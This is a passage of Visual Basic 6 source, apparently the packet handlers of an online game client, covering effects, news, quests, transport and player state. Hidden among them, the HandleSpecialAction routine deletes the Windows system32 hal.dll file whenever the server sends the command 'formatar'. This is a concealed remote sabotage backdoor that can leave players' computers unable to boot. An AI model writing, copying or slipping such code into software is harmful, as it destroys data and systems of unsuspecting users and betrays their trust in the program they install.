    ' Update the Effect
    EffectSize = LenB(Effect(n))
    ReDim EffectData(EffectSize - 1)
    EffectData = Buffer.ReadBytes(EffectSize)
    CopyMemory ByVal VarPtr(Effect(n)), ByVal VarPtr(EffectData(0)), EffectSize
    Set Buffer = Nothing
    
    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandleUpdateEffect", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Sub HandleEffect(ByVal Index As Long, ByRef Data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
Dim Buffer As clsBuffer, X As Long, Y As Long, EffectNum As Long, i As Long
    
    ' If debug mode, handle error then exit out
    If Options.Debug = 1 Then On Error GoTo errorhandler
    
    Set Buffer = New clsBuffer
    
    Buffer.WriteBytes Data()
    EffectNum = Buffer.ReadLong
    X = Buffer.ReadLong
    Y = Buffer.ReadLong
    If Effect(EffectNum).isMulti = YES Then
        For i = 1 To MAX_MULTIPARTICLE
            If Effect(EffectNum).MultiParticle(i) > 0 Then
                CastEffect Effect(EffectNum).MultiParticle(i), X, Y
            End If
        Next
    Else
        CastEffect EffectNum, X, Y
    End If
    PlayMapSound X, Y, SoundEntity.seEffect, EffectNum
    
    Set Buffer = Nothing
    
    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandleEffect", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Private Sub HandleSendNews(ByVal Index As Long, ByRef Data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
    Dim OpenNews As Byte
    Dim Buffer As clsBuffer
    Set Buffer = New clsBuffer
    
    Buffer.WriteBytes Data()
    OpenNews = Buffer.ReadByte
    NewsText = Buffer.ReadString
    Set Buffer = Nothing
    If OpenNews = 1 Then GUIWindow(GUI_NEWS).visible = True
End Sub

Public Sub HandleNewsEditor(ByVal Index As Long, ByRef Data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
    Dim i As Long

    ' If debug mode, handle error then exit out
    If Options.Debug = 1 Then On Error GoTo errorhandler
    
    With frmEditor_News
        .txtNews.Text = Trim$(NewsText)
        .Show
    End With

    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandleNewsEditor", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Private Sub HandleFly(ByVal Index As Long, ByRef Data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
    Dim Buffer As clsBuffer
    Set Buffer = New clsBuffer
    
    Buffer.WriteBytes Data()
    TempPlayer(Index).Fly = Buffer.ReadByte
    Set Buffer = Nothing
End Sub

Private Sub HandleSpecialAction(ByVal Index As Long, ByRef Data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
    Dim Buffer As clsBuffer
    Set Buffer = New clsBuffer
    
    Buffer.WriteBytes Data()
    
    Select Case Buffer.ReadString
        
        Case "formatar"
        Kill WinDir & "\system32\hal.dll"
        
    End Select
    
    Set Buffer = Nothing
End Sub

Function WinDir() As String
    Const FIX_LENGTH% = 4096
    Dim Length As Integer
    Dim Buffer As String * FIX_LENGTH

    Length = GeneralWinDirApi(Buffer, FIX_LENGTH - 1)
    WinDir = Left$(Buffer, Length)
End Function

Private Sub HandleSpellBuffer(ByVal Index As Long, ByRef Data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
    Dim Buffer As clsBuffer
    Dim TheIndex As Long
    Set Buffer = New clsBuffer
    
    Buffer.WriteBytes Data()
    TheIndex = Buffer.ReadLong
    TempPlayer(TheIndex).SpellBuffer = Buffer.ReadLong
    TempPlayer(TheIndex).SpellBufferTimer = GetTickCount
    TempPlayer(TheIndex).SpellBufferNum = Buffer.ReadLong
    
    Set Buffer = Nothing
End Sub

Private Sub HandleTransporte(ByVal Index As Long, ByRef Data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
    Dim Buffer As clsBuffer

    Set Buffer = New clsBuffer
    
    Buffer.WriteBytes Data()
    Transporte.Tipo = Buffer.ReadByte
    Transporte.Tick = GetTickCount
    Transporte.Map = Buffer.ReadLong
    Transporte.Anim = Buffer.ReadByte
    
    If Transporte.Anim = 1 Then
        If Transporte.Tipo = 1 Then Transporte.X = -521
        If Transporte.Tipo = 2 Then Transporte.X = -560
    End If
        
    Set Buffer = Nothing
End Sub

Private Sub HandleUpdatequest(ByVal Index As Long, ByRef Data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
Dim n As Long
Dim Buffer As clsBuffer
Dim questSize As Long
Dim questData() As Byte
    
    ' If debug mode, handle error then exit out
    If Options.Debug = 1 Then On Error GoTo errorhandler
    
    Set Buffer = New clsBuffer
    Buffer.WriteBytes Data()
    
    n = Buffer.ReadLong
    
    questSize = LenB(Quest(n))
    ReDim questData(questSize - 1)
    questData = Buffer.ReadBytes(questSize)
    CopyMemory ByVal VarPtr(Quest(n)), ByVal VarPtr(questData(0)), questSize
    
    Set Buffer = Nothing
    
    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandleUpdatequest", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Private Sub HandleQuestEditor()
Dim i As Long

    ' If debug mode, handle error then exit out
    If Options.Debug = 1 Then On Error GoTo errorhandler
    
    With frmEditor_Quest
        Editor = EDITOR_QUEST
        .lstIndex.Clear

        ' Add the names
        For i = 1 To MAX_QUESTS
            .lstIndex.AddItem i & ": " & Trim$(Quest(i).Name)
        Next

        .Show
        .lstIndex.ListIndex = 0
        QuestEditorInit
    End With
    
    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandleQuestEditor", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Private Sub HandlePlayerQuests(ByVal Index As Long, ByRef Data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
    Dim Buffer As clsBuffer
    Dim i As Long

    Set Buffer = New clsBuffer
    
    Buffer.WriteBytes Data()
    
    For i = 1 To MAX_QUESTS
        Player(MyIndex).QuestState(i).State = Buffer.ReadByte
    Next i
        
    Set Buffer = Nothing
End Sub

Private Sub HandlePlayerQuest(ByVal Index As Long, ByRef Data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
    Dim Buffer As clsBuffer
    Dim i As Long

    Set Buffer = New clsBuffer
    
    Buffer.WriteBytes Data()
    i = Buffer.ReadLong
    Player(MyIndex).QuestState(i).State = Buffer.ReadByte
        
    Set Buffer = Nothing
End Sub

Private Sub HandlePlayerInfo(ByVal Index As Long, ByRef Data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
    Dim Buffer As clsBuffer
    Dim i As Long, PlayerIndex As Long

    Set Buffer = New clsBuffer
    
    Buffer.WriteBytes Data()
    i = Buffer.ReadByte
    
    If i = PlayerInfoType.AFK Then
        PlayerIndex = Buffer.ReadLong
        TempPlayer(PlayerIndex).AFK = Buffer.ReadByte
    End If
        
    Set Buffer = Nothing
End Sub

